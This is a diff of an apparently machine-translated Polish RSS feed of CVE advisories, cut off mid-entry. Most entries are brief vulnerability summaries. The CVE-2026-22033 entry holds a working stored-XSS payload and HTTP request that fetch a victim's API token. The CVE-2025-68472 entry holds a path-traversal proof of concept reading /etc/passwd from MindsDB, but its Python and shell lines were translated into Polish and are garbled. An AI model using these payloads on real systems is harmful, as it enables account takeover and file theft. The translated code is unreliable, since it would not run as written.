@@ -1,5 +1,159 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2025-41078</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-41078</link><pubDate>Mon, 12 Jan 2026 14:59:26 +0000</pubDate><description>Słabości w mechanizmach autoryzacji Viafirma Documents v3.7.129 umożliwiają uwierzytelnionemu użytkownikowi bez uprawnień wyświetlanie innych danych użytkownika i uzyskiwanie do nich dostępu, korzystanie z funkcji tworzenia, modyfikowania i usuwania użytkowników oraz zwiększanie uprawnień poprzez podszywanie się pod innych użytkowników aplikacji podczas generowania i podpisywania dokumentów.</description></item><item><title>CVE-2025-41077</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-41077</link><pubDate>Mon, 12 Jan 2026 14:54:51 +0000</pubDate><description>W Viafirma Inbox v4.5.13 odkryto lukę IDOR, która pozwala każdemu uwierzytelnionemu użytkownikowi bez uprawnień w aplikacji wyświetlić listę wszystkich użytkowników, uzyskać dostęp i modyfikować ich dane.Pozwala to na modyfikację adresów e-mail użytkownika, a następnie wykorzystanie funkcji odzyskiwania hasła w celu uzyskania dostępu do aplikacji poprzez podszywanie się pod dowolnego użytkownika, w tym także posiadającego uprawnienia administracyjne.</description></item><item><title>CVE-2025-41004</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-41004</link><pubDate>Mon, 12 Jan 2026 13:55:28 +0000</pubDate><description>System zarządzania dokumentacją pacjentów firmy Imaster jest podatny na wstrzyknięcie kodu SQL w punkcie końcowym „/projects/hospital/admin/complaints.php” poprzez parametr „id”.</description></item><item><title>CVE-2025-41003</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-41003</link><pubDate>Mon, 12 Jan 2026 13:50:34 +0000</pubDate><description>System zarządzania danymi pacjentów firmy Imaster zawiera zapisaną lukę w zabezpieczeniach typu Cross-Site Scripting (XSS) w punkcie końcowym „/projects/hospital/admin/edit_resident.php”.Po wstrzyknięciu złośliwego skryptu do parametru „firstname” kod JavaScript jest przechowywany i wykonywany za każdym razem, gdy użytkownik uzyskuje dostęp do listy pacjentów, umożliwiając osobie atakującej wykonanie dowolnego kodu JavaScript w przeglądarce ofiary.</description></item><item><title>CVE-2025-40978</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-40978</link><pubDate>Mon, 12 Jan 2026 11:28:35 +0000</pubDate><description>Luka w zabezpieczeniach typu Stored Cross-Site Scripting (XSS) w rozwiązaniu eCommerceGo SaaS firmy WorkDo, obejmująca przechowywany plik XSS wynikający z braku właściwej weryfikacji danych wejściowych użytkownika poprzez wysłanie żądania POST do „/ticket/x/conversion” przy użyciu parametru „reply_description”.</description></item><item><title>CVE-2025-40977</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-40977</link><pubDate>Mon, 12 Jan 2026 11:28:01 +0000</pubDate><description>Luka w zabezpieczeniach Stored Cross-Site Scripting (XSS) w rozwiązaniu eCommerceGo SaaS firmy WorkDo polegająca na braku właściwej weryfikacji danych wejściowych użytkownika poprzez wysłanie żądania POST do „/store-ticket” z wykorzystaniem parametrów „temat” i „opis”.</description></item><item><title>CVE-2025-40976</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-40976</link><pubDate>Mon, 12 Jan 2026 11:27:20 +0000</pubDate><description>Zapisana luka w zabezpieczeniach typu Cross-Site Scripting (XSS) w TicketGo firmy WorkDo polegająca na braku właściwej weryfikacji danych wejściowych użytkownika poprzez wysłanie żądania POST do „/ticketgo-saas/home” przy użyciu parametru „description”.</description></item><item><title>CVE-2025-40975</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-40975</link><pubDate>Mon, 12 Jan 2026 11:26:30 +0000</pubDate><description>Zapisana luka w zabezpieczeniach typu Cross-Site Scripting (XSS) w HRMGo WorkDo polegająca na braku właściwej weryfikacji danych wejściowych użytkownika poprzez wysłanie żądania POST do „/hrmgo/ticket/changereply” przy użyciu parametru „description”.</description></item><item><title>CVE-2025-14279</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14279</link><pubDate>Mon, 12 Jan 2026 08:15:58 +0000</pubDate><description>Wersje MLFlow do 3.4.0 włącznie są podatne na ataki związane z ponownym wiązaniem DNS z powodu braku sprawdzania nagłówka Origin na serwerze REST MLFlow.Ta luka pozwala złośliwym witrynom internetowym ominąć zabezpieczenia oparte na zasadach Same-Origin Policy i wykonywać nieautoryzowane wywołania względem punktów końcowych REST.Osoba atakująca może wysyłać zapytania, aktualizować i usuwać eksperymenty za pośrednictwem dotkniętych punktów końcowych, co może prowadzić do potencjalnej eksfiltracji, zniszczenia lub manipulacji danymi.Problem został rozwiązany w wersji 3.5.0.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-22250</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22250</link><pubDate>Mon, 12 Jan 2026 16:13:33 +0000</pubDate><description>### Wpływ
+Weryfikacja SSL zostanie pominięta w przypadku niektórych spreparowanych adresów URL.
+
+### Poprawki
+* https://github.com/WeblateOrg/wlc/pull/1097
+
+### Obejścia
+Unikaj używania niezaufanych konfiguracji wlc, ponieważ może to powodować niepewne połączenia.
+
+### Referencje
+Ten problem został nam zgłoszony przez [wh1zee](https://hackerone.com/wh1zee) za pośrednictwem HackerOne.</description></item><item><title>CVE-2026-22033</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-22033</link><pubDate>Mon, 12 Jan 2026 16:12:50 +0000</pubDate><description>### Prologue
+
+These vulnerabilities have been found and chained by DCODX-AI. Validation of the exploit chain has been confirmed manually. 
+
+### Summary
+
+A persistent stored cross-site scripting (XSS) vulnerability exists in the custom_hotkeys functionality of the application. An authenticated attacker (or one who can trick a user/administrator into updating their custom_hotkeys) can inject JavaScript code that executes in other users’ browsers when those users load any page using the `templates/base.html` template. Because the application exposes an API token endpoint (`/api/current-user/token`) to the browser and lacks robust CSRF protection on some API endpoints, the injected script may fetch the victim’s API token or call token reset endpoints — enabling full account takeover and unauthorized API access. This vulnerability is of critical severity due to the broad impact, minimal requirements for exploitation (authenticated user), and the ability to escalate privileges to full account compromise.
+
+### Details
+Within `templates/base.html`, the application renders user-controlled hotkey configuration via the following JavaScript snippet:
+
+```js
+var __customHotkeys = {{ user.custom_hotkeys|json_dumps_ensure_ascii|safe }};
+```
+Here, user.custom_hotkeys is run through json_dumps_ensure_ascii (in `core/templatetags/filters.py`) which performs `json.dumps(dictionary, ensure_ascii=False)`  but does not escape closing `&lt;/script&gt;` sequences or other dangerous characters. Because the template uses the `|safe` filter, the output is inserted into the HTML `&lt;script&gt;` context without further escaping.
+
+In `users/api.py`, the *PATCH* endpoint allows updating of `custom_hotkeys`:
+
+```python
+user.custom_hotkeys = serializer.validated_data['custom_hotkeys']
+user.save(update_fields=['custom_hotkeys'])
+```
+
+The serializer allows `&lt;` and `&gt;` characters (e.g., "&lt;/script&gt;&lt;script&gt;…"), so an attacker can craft a JSON payload via `PATCH /api/users/{id}/:`
+
+```json
+{
+   "first_name":"poc",
+   "last_name":"test",
+   "phone":"123",
+   "custom_hotkeys":{
+      "INJ;&lt;/script&gt;&lt;script&gt;fetch(`/api/current-user/token`).then(r=&gt;r.json()).then(t=&gt;console.log(t.token))&lt;/script&gt;&lt;script&gt;/*xx":{
+         "key":"x",
+         "active":true
+      }
+   }
+}
+```
+When another user loads a page using templates/base.html (for example `/user/account/` or `/`), the rendered JavaScript includes the injected string, causing closing of the original &lt;script&gt; tag and insertion of malicious `&lt;script&gt;` code. Because the application exposes `/api/current-user/token` ( in GET) which returns the user’s API token and CSRF protection is relaxed for this API path, the malicious script can fetch the token and send it to an attacker-controlled endpoint, thereby enabling account takeover and further API misuse.
+
+
+### PoC
+
+1. **Login to the application**
+- Go to the login page: `GET /user/login/`
+
+2. **Identify your user ID (via API)**
+- `GET /api/current-user/whoami`
+- In the response JSON you will see your user ID (for example `"id": 123`).
+- Note this ID for the next step.
+
+3. Inject a malicious hotkey payload in the PATCH request /api/users/{id}
+- Using the user API, send a `PATCH` request to update your `custom_hotkeys`.
+
+Example request
+
+```http
+PATCH /api/users/25 HTTP/1.1
+Host: 0.0.0.0:8080
+Content-Length: 288
+sentry-trace: 926224d7bbfb4f0da9f6ebe333744a52-88db4876de60036c-0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+content-type: application/json
+baggage: sentry-environment=opensource,sentry-release=1.21.0,sentry-public_key=5f51920ff82a4675a495870244869c6b,sentry-trace_id=926224d7bbfb4f0da9f6ebe333744a52,sentry-sample_rate=0.01,sentry-transaction=%2Fuser%2Faccount,sentry-sampled=false
+Accept: */*
+Origin: http://0.0.0.0:8080
+Referer: http://0.0.0.0:8080/user/account/personal-info
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,it;q=0.7,nl;q=0.6
+Cookie: {STRIPPED}
+Connection: keep-alive
+
+{
+   "first_name":"poc",
+   "last_name":"test",
+   "phone":"123",
+   "custom_hotkeys":{
+      "INJ;&lt;/script&gt;&lt;script&gt;fetch(`/api/current-user/token`).then(r=&gt;r.json()).then(t=&gt;console.log(t.token))&lt;/script&gt;&lt;script&gt;/*xx":{
+         "key":"x",
+         "active":true
+      }
+   }
+}
+```
+Example response
+```json
+{"id":25,"first_name":"poc","last_name":"test","username":"test","email":"test@dcodx.com","last_activity":"2025-10-24T15:18:18.494398Z","custom_hotkeys":{"INJ;&lt;/script&gt;&lt;script&gt;fetch(`/api/current-user/token`).then(r=&gt;r.json()).then(t=&gt;alert(t.token))&lt;/script&gt;&lt;script&gt;/*xx":{"key":"x","active":true}},"avatar":null,"initials":"pt","phone":"123","active_organization":1,"active_organization_meta":{"title":"Label Studio","email":"poc_test_xgd9ce@example.com"},"allow_newsletters":false,"date_joined":"2025-10-24T15:18:18.494532Z"}
+```
+4. Verify the injected string persists
+- Still logged in as your user, go to your account page (e.g., `GET /user/account/`).
+- See the alert containing the API access token for the user. In a real world attack this token is sent to the attacker server
+
+### Impact
+
+Exploitation impact:
+- Full account takeover of victim user(s).
+- Exposure of API tokens granting access to internal/external APIs.
+- Unauthorized API access, data exfiltration, token reset or privilege escalation.
+- If victim is administrator or privileged user, wide system compromise possible.
+
+Who is impacted:
+- All users who load the template and whose session/token is accessible via browser.
+- The organization’s application and data.
+- Potentially other end-users if cross-user token exfiltration occurs.</description></item><item><title>CVE-2025-68472</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68472</link><pubDate>Mon, 12 Jan 2026 16:10:55 +0000</pubDate><description>### Podsumowanie
+Nieuwierzytelnione przejście ścieżki w interfejsie API przesyłania plików pozwala każdemu wywołującemu odczytać dowolne pliki z systemu plików serwera i przenieść je do pamięci MindsDB, odsłaniając wrażliwe dane.Dotkliwość: Wysoka.
+
+### Szczegóły
+Procedura obsługi PUT w pliku.py bezpośrednio łączy dane kontrolowane przez użytkownika ze ścieżką systemu plików, gdy treść żądania to JSON, a `typ_źródła` nie jest ``url'`:
+
+- `data = request.json` (linia ~104) akceptuje dane wejściowe atakującego bez sprawdzania poprawności.
+- `file_path = os.path.join(temp_dir_path, data["file"])` (linia ~178) tworzy ścieżkę wewnątrz katalogu tymczasowego, ale jeśli `data["file"]` jest bezwzględne (np. `/home/secret.csv`), `os.path.join` ignoruje `temp_dir_path` i celuje w lokalizację określoną przez atakującego.
+- Wynikowa ścieżka jest przekazywana do `ca.file_controller.save_file(...)`, który otacza `FileReader(path=source_path)` (`mindsdb/interfaces/file/file_controller.py:66`), powodując, że aplikacja odczyta zawartość dowolnego pliku.Kolejne wywołanie `shutil.move(file_path, ...)` również przenosi plik ofiary do zarządzanej pamięci MindsDB.
+
+Tylko przesyłanie wieloczęściowe i przesyłanie pochodzące z adresu URL jest oczyszczane;W przesyłanych plikach JSON nie ma żadnego wywołania opcji „clear_filename” ani równoważnych kontroli.
+
+### PoC
+1. Uruchom MindsDB w Dockerze:
+,,bicie
+docker pull mindsdb/mindsdb:najnowsze
+uruchomienie okna dokowanego --rm -it -p 47334:47334 --name mindsdb-poc mindsdb/mindsdb:latest
+```
+2. Wykonaj exploit z hosta (zapisz jako poc.py i uruchom z `python poc.py`):
+```pyton
+# poc.py
+żądania importu, json
+
+podstawa = "http://127.0.0.1:47334"
+payload = {"file": "../../../../../etc/passwd"} # brak typu_źródła -&gt; trafia na podatną gałąź
+
+r = żądania.put(f"{base}/api/files/leak_rel", json=ładunek, limit czasu=10)
+print("Status PUT:", r.status_code, r.text)
+
+q = żądania.post(
+f"{base}/api/sql/query",
+json={"query": "WYBIERZ * Z plików.leak_rel"},
+limit czasu = 10,
+)
+print("Odpowiedź SQL:", json.dumps(q.json(), indent=2))
+```
+3. Odpowiedź SQL zwraca zawartość pliku `/etc/passwd`.Oryginalny plik znika ze swojej lokalizacji źródłowej, ponieważ moduł obsługi przenosi go do katalogu przechowywania MindsDB.
+
+### Wpływ
+- Każdy użytkownik, który może uzyskać dostęp do interfejsu API REST, może odczytać i wyodrębnić dowolne pliki, do których może uzyskać dostęp proces MindsDB, potencjalnie włączając dane uwierzytelniające, klucze tajne konfiguracji i klucze prywatne.</description></item><item><title>CVE-2025-71063</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-71063</link><pubDate>Mon, 12 Jan 2026 15:56:26 +0000</pubDate><description>Errands sprzed wersji 46.2.10 nie weryfikuje certyfikatów TLS dla serwerów CalDAV.
+
+CVSS Score: 8.2 (high)</description></item><item><title>CVE-2025-41078</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-41078</link><pubDate>Mon, 12 Jan 2026 14:59:26 +0000</pubDate><description>Słabości w mechanizmach autoryzacji Viafirma Documents v3.7.129 umożliwiają uwierzytelnionemu użytkownikowi bez uprawnień wyświetlanie innych danych użytkownika i uzyskiwanie do nich dostępu, korzystanie z funkcji tworzenia, modyfikowania i usuwania użytkowników oraz zwiększanie uprawnień poprzez podszywanie się pod innych użytkowników aplikacji podczas generowania i podpisywania dokumentów.</description></item><item><title>CVE-2025-41077</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-41077</link><pubDate>Mon, 12 Jan 2026 14:54:51 +0000</pubDate><description>W Viafirma Inbox v4.5.13 odkryto lukę IDOR, która pozwala każdemu uwierzytelnionemu użytkownikowi bez uprawnień w aplikacji wyświetlić listę wszystkich użytkowników, uzyskać dostęp i modyfikować ich dane.Pozwala to na modyfikację adresów e-mail użytkownika, a następnie wykorzystanie funkcji odzyskiwania hasła w celu uzyskania dostępu do aplikacji poprzez podszywanie się pod dowolnego użytkownika, w tym także posiadającego uprawnienia administracyjne.</description></item><item><title>CVE-2025-41004</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-41004</link><pubDate>Mon, 12 Jan 2026 13:55:28 +0000</pubDate><description>System zarządzania dokumentacją pacjentów firmy Imaster jest podatny na wstrzyknięcie kodu SQL w punkcie końcowym „/projects/hospital/admin/complaints.php” poprzez parametr „id”.</description></item><item><title>CVE-2025-41003</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-41003</link><pubDate>Mon, 12 Jan 2026 13:50:34 +0000</pubDate><description>System zarządzania danymi pacjentów firmy Imaster zawiera zapisaną lukę w zabezpieczeniach typu Cross-Site Scripting (XSS) w punkcie końcowym „/projects/hospital/admin/edit_resident.php”.Po wstrzyknięciu złośliwego skryptu do parametru „firstname” kod JavaScript jest przechowywany i wykonywany za każdym razem, gdy użytkownik uzyskuje dostęp do listy pacjentów, umożliwiając osobie atakującej wykonanie dowolnego kodu JavaScript w przeglądarce ofiary.</description></item><item><title>CVE-2025-40978</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-40978</link><pubDate>Mon, 12 Jan 2026 11:28:35 +0000</pubDate><description>Luka w zabezpieczeniach typu Stored Cross-Site Scripting (XSS) w rozwiązaniu eCommerceGo SaaS firmy WorkDo, obejmująca przechowywany plik XSS wynikający z braku właściwej weryfikacji danych wejściowych użytkownika poprzez wysłanie żądania POST do „/ticket/x/conversion” przy użyciu parametru „reply_description”.</description></item><item><title>CVE-2025-40977</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-40977</link><pubDate>Mon, 12 Jan 2026 11:28:01 +0000</pubDate><description>Luka w zabezpieczeniach Stored Cross-Site Scripting (XSS) w rozwiązaniu eCommerceGo SaaS firmy WorkDo polegająca na braku właściwej weryfikacji danych wejściowych użytkownika poprzez wysłanie żądania POST do „/store-ticket” z wykorzystaniem parametrów „temat” i „opis”.</description></item><item><title>CVE-2025-40976</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-40976</link><pubDate>Mon, 12 Jan 2026 11:27:20 +0000</pubDate><description>Zapisana luka w zabezpieczeniach typu Cross-Site Scripting (XSS) w TicketGo firmy WorkDo polegająca na braku właściwej weryfikacji danych wejściowych użytkownika poprzez wysłanie żądania POST do „/ticketgo-saas/home” przy użyciu parametru „description”.</description></item><item><title>CVE-2025-40975</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-40975</link><pubDate>Mon, 12 Jan 2026 11:26:30 +0000</pubDate><description>Zapisana luka w zabezpieczeniach typu Cross-Site Scripting (XSS) w HRMGo WorkDo polegająca na braku właściwej weryfikacji danych wejściowych użytkownika poprzez wysłanie żądania POST do „/hrmgo/ticket/changereply” przy użyciu parametru „description”.</description></item><item><title>CVE-2025-14279</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14279</link><pubDate>Mon, 12 Jan 2026 08:15:58 +0000</pubDate><description>Wersje MLFlow do 3.4.0 włącznie są podatne na ataki związane z ponownym wiązaniem DNS z powodu braku sprawdzania nagłówka Origin na serwerze REST MLFlow.Ta luka pozwala złośliwym witrynom internetowym ominąć zabezpieczenia oparte na zasadach Same-Origin Policy i wykonywać nieautoryzowane wywołania względem punktów końcowych REST.Osoba atakująca może wysyłać zapytania, aktualizować i usuwać eksperymenty za pośrednictwem dotkniętych punktów końcowych, co może prowadzić do potencjalnej eksfiltracji, zniszczenia lub manipulacji danymi.Problem został rozwiązany w wersji 3.5.0.
 
 CVSS Score: 8.1 (high)</description></item><item><title>CVE-2026-0855</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0855</link><pubDate>Mon, 12 Jan 2026 06:44:40 +0000</pubDate><description>Niektóre modele kamer IP opracowane przez Merit LILIN mają lukę w zabezpieczeniach systemu operacyjnego polegającej na wstrzykiwaniu poleceń, umożliwiającą uwierzytelnionym zdalnym atakującym wstrzykiwanie dowolnych poleceń systemu operacyjnego i wykonywanie ich na urządzeniu.
 
@@ -11,7 +165,7 @@ CVSS Score: 5.3 (medium)</description></item><item><title>CVE-2025-52694</title>
 
 CVSS Score: 10.0 (critical)</description></item><item><title>CVE-2026-0852</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0852</link><pubDate>Mon, 12 Jan 2026 00:02:06 +0000</pubDate><description>W kodzie-projektach Online Music Site 1.0 wykryto lukę w zabezpieczeniach.Elementem, którego dotyczy problem, jest nieznana funkcja pliku /Administrator/PHP/AdminUpdateUser.php.Manipulacja identyfikatorem argumentu powoduje wstrzyknięcie sql.Atak może zostać przeprowadzony zdalnie.Exploit został udostępniony publicznie i może zostać wykorzystany do ataków.
 
-CVSS Score: 7.3 (high)</description></item><item><title>CVE-2025-65553</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-65553</link><pubDate>Mon, 12 Jan 2026 00:00:00 +0000</pubDate><description>Domowy system bezpieczeństwa D3D Wi-Fi ZX-G12 v2.1.17 jest podatny na zakłócenia RF na kanale czujnika alarmowego 433 MHz.Osoba atakująca znajdująca się w zasięgu częstotliwości radiowej może transmitować ciągłe zakłócenia, aby zablokować transmisję czujników, co może spowodować przeoczenie alarmów i utratę monitorowania bezpieczeństwa.W urządzeniu brakuje funkcji wykrywania lub łagodzenia zakłóceń, co powoduje odmowę usługi, która może prowadzić do niewykrytych włamań lub braku uruchomienia alertów bezpieczeństwa.</description></item><item><title>CVE-2025-65552</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-65552</link><pubDate>Mon, 12 Jan 2026 00:00:00 +0000</pubDate><description>Domowy system zabezpieczeń D3D Wi-Fi ZX-G12 v2.1.1 jest podatny na ataki polegające na odtwarzaniu sygnału radiowego na kanale komunikacyjnym czujnika 433 MHz.System nie implementuje kodów zmiennych, uwierzytelniania wiadomości ani zabezpieczenia przed powtórzeniem, co pozwala atakującemu znajdującemu się w zasięgu częstotliwości radiowej nagrać ważne ramki alarmowe/kontrolne i odtworzyć je w celu wywołania fałszywych alarmów.</description></item><item><title>CVE-2026-0851</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0851</link><pubDate>Sun, 11 Jan 2026 23:32:07 +0000</pubDate><description>W projektach kodu Online Music Site 1.0 wykryto lukę.Elementem, którego dotyczy problem, jest nieznana funkcja pliku /Administrator/PHP/AdminAddUser.php.Manipulacja argumentem txtusername prowadzi do wstrzyknięcia sql.Możliwe jest zdalne wykorzystanie ataku.Exploit jest publicznie dostępny i może zostać wykorzystany.
+CVSS Score: 7.3 (high)</description></item><item><title>CVE-2025-65553</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-65553</link><pubDate>Mon, 12 Jan 2026 00:00:00 +0000</pubDate><description>Domowy system bezpieczeństwa D3D Wi-Fi ZX-G12 v2.1.17 jest podatny na zakłócenia RF na kanale czujnika alarmowego 433 MHz.Osoba atakująca znajdująca się w zasięgu częstotliwości radiowej może transmitować ciągłe zakłócenia, aby zablokować transmisję czujników, co może spowodować przeoczenie alarmów i utratę monitorowania bezpieczeństwa.W urządzeniu brakuje funkcji wykrywania lub łagodzenia zakłóceń, co powoduje odmowę usługi, która może prowadzić do niewykrytych włamań lub braku uruchomienia alertów bezpieczeństwa.</description></item><item><title>CVE-2025-65552</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-65552</link><pubDate>Mon, 12 Jan 2026 00:00:00 +0000</pubDate><description>Domowy system zabezpieczeń D3D Wi-Fi ZX-G12 v2.1.1 jest podatny na ataki polegające na odtwarzaniu sygnału radiowego na kanale komunikacyjnym czujnika 433 MHz.System nie implementuje kodów zmiennych, uwierzytelniania wiadomości ani zabezpieczenia przed powtórzeniem, co pozwala atakującemu znajdującemu się w zasięgu częstotliwości radiowej nagrać ważne ramki alarmowe/kontrolne i odtworzyć je w celu wywołania fałszywych alarmów.</description></item><item><title>CVE-2025-66939</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66939</link><pubDate>Mon, 12 Jan 2026 00:00:00 +0000</pubDate><description>Luka w zabezpieczeniach Cross Site Scripting w 66biolinks autorstwa AltumCode v.61.0.1 umożliwia atakującemu wykonanie dowolnego kodu za pośrednictwem spreparowanego pliku favicon</description></item><item><title>CVE-2026-0851</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0851</link><pubDate>Sun, 11 Jan 2026 23:32:07 +0000</pubDate><description>W projektach kodu Online Music Site 1.0 wykryto lukę.Elementem, którego dotyczy problem, jest nieznana funkcja pliku /Administrator/PHP/AdminAddUser.php.Manipulacja argumentem txtusername prowadzi do wstrzyknięcia sql.Możliwe jest zdalne wykorzystanie ataku.Exploit jest publicznie dostępny i może zostać wykorzystany.
 
 CVSS Score: 7.3 (high)</description></item><item><title>CVE-2026-0850</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0850</link><pubDate>Sun, 11 Jan 2026 23:02:06 +0000</pubDate><description>W code-projects Intern Membership Management System 1.0 została stwierdzona podatność.Problemem dotknięta jest nieznana funkcja pliku /admin/delete_activity.php.Wykonanie manipulacji argumentem Activity_id może prowadzić do wstrzyknięcia sql.Atak może zostać przeprowadzony zdalnie.Exploit został publicznie ujawniony i może zostać wykorzystany.
 
@@ -3150,7 +3304,9 @@ CVSS Score: 7.3 (high)</description></item><item><title>CVE-2025-69226</title><l
 
 CVSS Score: 7.5 (high)</description></item><item><title>CVE-2025-68436</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68436</link><pubDate>Mon, 05 Jan 2026 21:46:01 +0000</pubDate><description>Craft to platforma do tworzenia cyfrowych doświadczeń.W wersjach od 5.0.0-RC1 do 5.8.20 i od 4.0.0-RC1 do 4.16.16 uwierzytelnieni użytkownicy instalacji Craft mogą potencjalnie ujawnić wrażliwe zasoby poprzez zdjęcie profilowe użytkownika za pośrednictwem złośliwie spreparowanych żądań.Użytkownicy powinni dokonać aktualizacji do poprawionych wersji (5.8.21 i 4.16.17), aby złagodzić problem.</description></item><item><title>CVE-2025-68428</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68428</link><pubDate>Mon, 05 Jan 2026 21:43:55 +0000</pubDate><description>jsPDF to biblioteka do generowania plików PDF w JavaScript.W wersjach wcześniejszych niż 4.0.0 kontrola użytkownika nad pierwszym argumentem metody loadingFile w kompilacji node.js umożliwiała dołączanie plików lokalnych/przechodzenie ścieżek.Jeśli użytkownik ma możliwość przekazania nieoczyszczonych ścieżek do metody LoadFile, użytkownik może pobrać zawartość dowolnych plików w lokalnym systemie plików, w którym działa proces węzła. Zawartość pliku jest dosłownie dołączana do wygenerowanych plików PDF.Inne metody, których to dotyczy, to `addImage`, `html` i `addFont`.Dotyczy to tylko kompilacji biblioteki node.js, a mianowicie plików `dist/jspdf.node.js` i `dist/jspdf.node.min.js`.Luka została naprawiona w jsPDF@4.0.0.Ta wersja domyślnie ogranicza dostęp do systemu plików.Ta semver-major aktualizacja nie wprowadza innych istotnych zmian.Dostępne są pewne obejścia.W przypadku najnowszych wersji węzłów jsPDF zaleca używanie flagi `--permission` w środowisku produkcyjnym.Funkcja została wprowadzona eksperymentalnie w wersji 20.0.0 i jest stabilna od wersji 22.13.0/23.5.0/24.0.0.W przypadku starszych wersji węzłów oczyść ścieżki dostarczone przez użytkownika przed przekazaniem ich do jsPDF.</description></item><item><title>CVE-2025-67732</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-67732</link><pubDate>Mon, 05 Jan 2026 21:41:01 +0000</pubDate><description>Dify to platforma do tworzenia aplikacji LLM typu open source.Przed wersją 1.11.0 klucz API był udostępniany w interfejsie użytkownika w postaci zwykłego tekstu, umożliwiając użytkownikom niebędącym administratorami jego przeglądanie i ponowne użycie.Może to prowadzić do nieautoryzowanego dostępu do usług stron trzecich, potencjalnie zużywając ograniczone przydziały.Wersja 1.11.0 rozwiązuje ten problem.</description></item><item><title>CVE-2025-66648</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-66648</link><pubDate>Mon, 05 Jan 2026 21:33:14 +0000</pubDate><description>vega-functions zapewnia implementacje funkcji dla języka wyrażeń Vega.Przed wersją 6.1.1 w przypadku witryn umożliwiających użytkownikom wprowadzanie danych wejściowych przez niezaufanego użytkownika, złośliwe użycie funkcji wewnętrznej (niebędącej częścią publicznego interfejsu API) mogło zostać wykorzystane do niezamierzonego uruchomienia kodu JavaScript (XSS).Ten problem został rozwiązany w funkcjach Vega `6.1.1`.Nie ma innego rozwiązania niż aktualizacja.Użycie `vega.expressionInterpreter` zgodnie z opisem w trybie awaryjnym CSP nie zapobiega temu problemowi.
 
-CVSS Score: 7.2 (high)</description></item><item><title>CVE-2026-0625</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0625</link><pubDate>Mon, 05 Jan 2026 21:14:48 +0000</pubDate><description>Wiele urządzeń bram D-Link DSL zawiera lukę w zabezpieczeniach umożliwiającą wstrzykiwanie poleceń w punkcie końcowym dnscfg.cgi z powodu nieprawidłowego oczyszczenia parametrów konfiguracyjnych DNS dostarczonych przez użytkownika.Nieuwierzytelniony zdalny atakujący może wprowadzić i wykonać dowolne polecenia powłoki, co spowoduje zdalne wykonanie kodu.Punkt końcowy, którego dotyczy problem, jest również powiązany z zachowaniem nieuwierzytelnionych modyfikacji DNS („DNSChanger”) udokumentowanym przez firmę D-Link, która zgłosiła aktywne kampanie wykorzystujące ataki ukierunkowane na warianty oprogramowania sprzętowego modeli DSL-2740R, DSL-2640B, DSL-2780B i DSL-526B od 2016 r. do 2019 r. Fundacja Shadowserver Foundation odnotowała dowody wykorzystania w dniu 27.11.2025 r.(UTC).Na początku 2020 roku uznano, że urządzenia, których dotyczy problem, wycofały się z eksploatacji.</description></item><item><title>CVE-2026-21857</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-21857</link><pubDate>Mon, 05 Jan 2026 20:02:58 +0000</pubDate><description>### Podsumowanie
+CVSS Score: 7.2 (high)</description></item><item><title>CVE-2026-0625</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0625</link><pubDate>Mon, 05 Jan 2026 21:14:48 +0000</pubDate><description>Wiele urządzeń bram D-Link DSL zawiera lukę w zabezpieczeniach umożliwiającą wstrzykiwanie poleceń w punkcie końcowym dnscfg.cgi z powodu nieprawidłowego oczyszczenia parametrów konfiguracyjnych DNS dostarczonych przez użytkownika.Nieuwierzytelniony zdalny atakujący może wprowadzić i wykonać dowolne polecenia powłoki, co spowoduje zdalne wykonanie kodu.Punkt końcowy, którego dotyczy problem, jest również powiązany z zachowaniem nieuwierzytelnionych modyfikacji DNS („DNSChanger”) udokumentowanym przez firmę D-Link, która zgłosiła aktywne kampanie wykorzystujące ataki ukierunkowane na warianty oprogramowania sprzętowego modeli DSL-2740R, DSL-2640B, DSL-2780B i DSL-526B od 2016 r. do 2019 r. Fundacja Shadowserver Foundation odnotowała dowody wykorzystania w dniu 27.11.2025 r.(UTC).Na początku 2020 roku uznano, że urządzenia, których dotyczy problem, wycofały się z 